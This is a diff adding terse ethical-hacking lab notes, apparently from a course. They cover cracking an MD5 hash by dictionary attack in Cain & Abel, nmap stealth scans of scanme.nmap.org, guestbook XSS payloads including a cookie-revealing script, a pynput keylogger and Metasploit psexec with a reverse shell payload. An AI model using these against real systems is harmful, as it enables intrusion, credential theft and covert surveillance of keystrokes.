@@ -1,4 +1,64 @@
 
+2.2)
+cabin abel
+
+rockyou.txt file
+
+1) open -> cabin & abel -> click on Tools
+
+2) Tools -> Click on Hash Calculator 
+
+3) In Text to password type -- > password
+
+4) you will find list of hash find --> MD5 copy Hash 
+
+5) click cancel 
+
+6) click on --> Cracker on top --> left side select --> MD5 hashes 
+ 
+7) click or double click on MD5 hash --> click on Add to list --> paste the hash value --> ok
+
+8) Right click on the hash --> select Dictonary attack --> on the file section click or right click --> click add to list 
+
+9) insert you rockyou.txt file --> start 
+
+
+4)
+1) scanme.nmap.org
+
+2) ACK Scan (-sA)
+Command:   nmap -sA -T4 scanme.nmap.org
+
+3) SYN Scan (-sS)
+ nmap -sS scanme.nmap.org
+
+4)SCAN 3: FIN Scan (-sF)
+nmap -sF -T4 scanme.nmap.org
+
+5) NULL Scan (-sN)
+nmap -sN -p 22 scanme.nmap.org
+
+6) XMAS Scan (-sX)
+Sets FIN + PSH + URG flags.
+nmap -sX -p 22 scanme.nmap.org
+
+7) gooogle dns
+target type -- > 8.8.8.8
+
+
+6) CSS 
+
+click on XSS 
+1)
+--> name = XYZ  
+--> message = <script>alert('You are hack')</script>
+--> click on sign guestbook
+
+2)
+--> name = XYZ
+--> message = <script>alert(document.cookie)</script>
+
+
 9)
 pip install pynput
 
@@ -15,3 +75,11 @@ def on_press(key):
     logging.info(str(key))
 with Listener(on_press=on_press) as listener:
     listener.join()
+
+
+10)
+1) msfconsole 
+
+2) use exploit/windows/smb/psexec
+
+3) set payload/windows/shell/reverse_tcp
